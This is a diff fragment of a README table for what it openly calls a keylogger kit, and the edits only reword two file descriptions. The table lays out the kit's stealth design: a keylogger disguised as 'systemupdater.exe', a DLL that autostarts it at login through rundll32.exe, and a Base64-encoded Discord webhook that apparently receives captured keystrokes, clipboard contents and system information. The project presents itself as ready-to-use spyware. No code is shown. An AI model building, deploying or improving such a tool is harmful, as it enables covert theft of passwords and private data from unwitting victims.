@@ -24,7 +24,7 @@ Includes a one-click installer, automatic webhook encoding, and stealth autostar
 
 | File / Folder                        | Description                                                                 |
 | ----------------------------------- | --------------------------------------------------------------------------- |
-| `installer.exe`                     | One-click installer GUI – encodes webhook and sets up everything            |
+| `installer.exe`                     | One-click installer GUI – encodes the webhook and sets up everything automatically            |
 | `systemupdater.exe`                 | Keylogger binary (compiled from `systemupdater.py`)                         |
 | `update.dll`                        | DLL that loads the keylogger at login using `rundll32.exe`                 |
 | `cache.db`                          | Contains the encoded Discord webhook (Base64)                               |
@@ -34,7 +34,7 @@ Includes a one-click installer, automatic webhook encoding, and stealth autostar
 | `Source_Code/systemupdater.py`     | Main keylogger logic (keystrokes, clipboard, system info)                   |
 | `Source_Code/Base64_webhook_encoder.py` | Optional CLI tool to encode webhook manually                         |
 | `Source_Code/startloader.cpp`      | Source code for DLL that triggers the EXE                                   |
-| `Source_Code/icon.ico`             | Optional icon used for builds                                               |
+| `Source_Code/icon.ico`             | Optional icon used during EXE compilation                                               |
 
 ---
 
